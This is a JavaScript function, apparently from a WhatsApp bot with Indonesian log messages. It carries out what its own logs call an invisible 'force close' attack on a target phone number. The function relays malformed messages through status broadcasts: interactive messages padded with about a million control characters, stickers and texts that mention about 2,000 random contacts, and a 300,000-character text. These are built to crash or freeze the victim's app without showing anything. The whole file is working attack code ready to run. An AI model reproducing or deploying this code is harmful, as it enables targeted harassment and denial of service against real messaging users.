async function invisSpam(target) {
   await sock.relayMessage(target, {
    sendPaymentMessage: {}
  }, {
    participant: { jid: target }
  })
    const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];

    for (const x of type) {
        const enty = Math.floor(Math.random() * type.length);
        const msg = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "\u0003",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: x,
                                paramsJson: "\x10".repeat(1000000),
                                version: 3
                            },
                            entryPointConversionSource: type[enty]
                        }
                    }
                }
            },
            {
                participant: { jid: target }
            }
        );
        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                messageId: msg.key.id,
                participant: { jid: target }
            }
        );
        await new Promise(resolve => setTimeout(resolve, 1000));
    }

    const mediaDatamrb = [
        {
            ID: "68BD677B",
            uri: "t62.43144-24/10000000_1407285833860834_2249780575933148603_n.enc?ccb=11-4&oh",
            buffer: "01_Q5Aa2AFffQpqWVK7GvldUiQQNd4Li_6BbUMZ3yHwZ55g5SuVKA&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "o+hchsgN0ZtdSp8iBlD1Yb/kx9Mkrer8km3pw5azkj0=",
            mkey: "C+7Uy3QyEAHwMpIR7CGaKEhpZ3KYFS67TcYxcNbm73EXo="
        },
        {
            ID: "68BD469B",
            uri: "t62.43144-24/10000000_2553936021621845_4020476590210043024_n.enc?ccb=11-4&oh",
            buffer: "01_Q5Aa2AHPt6cTL57bihyVMMppUvQiXg-m7Oog3TAebzRVWsCNEw&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "2cGzUZDAYCZq7QbAoiWSI1h5Z0WIje7VK1IiUgqu/+Y=",
            mkey: "1EvzGhM2IL78wiXyfpRrcr8o0ws/hTjtghBQUF+v3wI="
        }
    ];

    let sequentialIndexmrb = 0;

    try {
        if (!sock || !sock.user) {
            throw new Error("Socket tidak terrekasi!");
        }

        console.log(chalk.green(`🚀 Memulai serangan FC invis ke ${target}`));

        let successCount = 0;
        let errorCount = 0;

        for (let i = 0; i < 3; i++) {
            try {
                if (!sock || !sock.user) {
                    throw new Error("Socket putus koneksi selama serangan!");
                }

                const selectedMedia = mediaDatamrb[sequentialIndexmrb];
                sequentialIndexmrb = (sequentialIndexmrb + 1) % mediaDatamrb.length;

                const MD_ID = selectedMedia.ID;
                const MD_Uri = selectedMedia.uri;
                const MD_Buffer = selectedMedia.buffer;
                const MD_SID = selectedMedia.sid;
                const MD_sha256 = selectedMedia.SHA256;
                const MD_encsha25 = selectedMedia.ENCSHA256;
                const mkey = selectedMedia.mkey;

                let parse = true;
                let type = "image/webp";
                if (11 > 9) {
                    parse = parse ? false : true;
                }

                let stickerMessage = {
                    viewOnceMessage: {
                        message: {
                            stickerMessage: {
                                url: `https://mmg.whatsapp.net/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}&mms3=true`,
                                fileSha256: Buffer.from(MD_sha256, "base64"),
                                fileEncSha256: Buffer.from(MD_encsha25, "base64"),
                                mediaKey: Buffer.from(mkey, "base64"),
                                mimetype: type,
                                directPath: `/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}`,
                                fileLength: {
                                    low: Math.floor(Math.random() * 1000),
                                    high: 0,
                                    unsigned: true
                                },
                                mediaKeyTimestamp: {
                                    low: Math.floor(Math.random() * 1700000000),
                                    high: 0,
                                    unsigned: false
                                },
                                firstFrameLength: 19904,
                                firstFrameSidecar: "KN4kQ5pyABRAgA==",
                                isAnimated: true,
                                contextInfo: {
                                    participant: target,
                                    mentionedJid: [
                                        "0@s.whatsapp.net",
                                        ...Array.from(
                                            { length: 1998 },
                                            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                        )
                                    ],
                                    groupMentions: [],
                                    entryPointConversionSource: "non_contact",
                                    entryPointConversionApp: "whatsapp",
                                    entryPointConversionDelaySeconds: 467593
                                },
                                stickerSentTs: {
                                    low: Math.floor(Math.random() * -20000000),
                                    high: 555,
                                    unsigned: parse
                                },
                                isAvatar: parse,
                                isAiSticker: parse,
                                isLottie: parse
                            }
                        }
                    }
                };

                let interactiveMessage = {
                    viewOnceMessage: {
                        message: {
                            interactiveResponseMessage: {
                                body: {
                                    text: "蟽骗伪讗 搔伪喙€",
                                    format: "DEFAULT"
                                },
                                nativeFlowResponseMessage: {
                                    name: "call_permission_request",
                                    paramsJson: "\u0000".repeat(1045000),
                                    version: 3
                                },
                                entryPointConversionSource: "galaxy_message"
                            }
                        }
                    }
                };

                let galaxyMessage = {
                    viewOnceMessage: {
                        message: {
                            interactiveResponseMessage: {
                                body: {
                                    text: "喙弔喔勛 蟼喙徯逞",
                                    format: "DEFAULT"
                                },
                                nativeFlowResponseMessage: {
                                    name: "galaxy_message",
                                    paramsJson: "\x10".repeat(1045000),
                                    version: 3
                                },
                                entryPointConversionSource: "call_permission_request"
                            }
                        }
                    }
                };

                let textMessage = {
                    extendedTextMessage: {
                        text: "驴" + "軎".repeat(300000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                target,
                                ...Array.from(
                                    { length: 2000 },
                                    () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                                )
                            ]
                        }
                    }
                };

                const messages = [stickerMessage, interactiveMessage, galaxyMessage, textMessage];

                for (const msgContent of messages) {
                    const msg = generateWAMessageFromContent(target, msgContent, {});
                    await sock.relayMessage(
                        "status@broadcast",
                        msg.message,
                        {
                            messageId: msg.key.id,
                            statusJidList: [target],
                            additionalNodes: [
                                {
                                    tag: "meta",
                                    attrs: {},
                                    content: [
                                        {
                                            tag: "mentioned_users",
                                            attrs: {},
                                            content: [
                                                {
                                                    tag: "to",
                                                    attrs: { jid: target },
                                                    content: undefined
                                                }
                                            ]
                                        }
                                    ]
                                }
                            ]
                        }
                    );
                }

                successCount++;

                const percent = ((i + 1) / 3) * 100;
                console.log(
                    chalk.red(
                        `Mengirim FC invis ke ${target.replace("@s.whatsapp.net", "")}\nProses: (${percent.toFixed(2)}%)`
                    )
                );
            } catch (batchError) {
                errorCount++;
                console.error(chalk.red(`❌ Batch ${i + 1}/3 GAGAL: ${batchError.message}`));
                if (errorCount > 3) {
                    console.error(chalk.red("⚠️ Terlalu banyak kesalahan, menghentikan serangan!"));
                    break;
                }
            }

            if (i < 2) {
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        console.log(chalk.green(`✓ ${successCount}/3`) + chalk.red(` ✗ ${errorCount}/3`));

        try {
            const lastMsg = generateWAMessageFromContent(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            stickerMessage: {
                                url: `https://mmg.whatsapp.net/v/${mediaDatamrb[0].uri}`,
                                fileSha256: Buffer.from(mediaDatamrb[0].SHA256, "base64"),
                                fileEncSha256: Buffer.from(mediaDatamrb[0].ENCSHA256, "base64"),
                                mediaKey: Buffer.from(mediaDatamrb[0].mkey, "base64"),
                                mimetype: "image/webp"
                            }
                        }
                    }
                },
                {}
            );

            await sock.relayMessage(
                target,
                {
                    groupStatusMentionMessage: {
                        message: {
                            protocolMessage: {
                                key: lastMsg.key,
                                type: 25
                            }
                        }
                    }
                },
                {
                    additionalNodes: [
                        {
                            tag: "meta",
                            attrs: {
                                is_status_mention: " FC invis - serangan "
                            },
                            content: undefined
                        }
                    ]
                }
            );
            console.log(chalk.green("✅ Pesan menyebutkan berhasil dikirim"));
        } catch (mentionError) {
            console.error(chalk.red(`❌ gagal: ${mentionError.message}`));
        }

        return { success: true, successCount, errorCount };
    } catch (error) {
        console.error(chalk.red(`❌ FC invis KESALAHAN FATALE: ${error.message}`));
        return { success: false, error: error.message };
    }
}
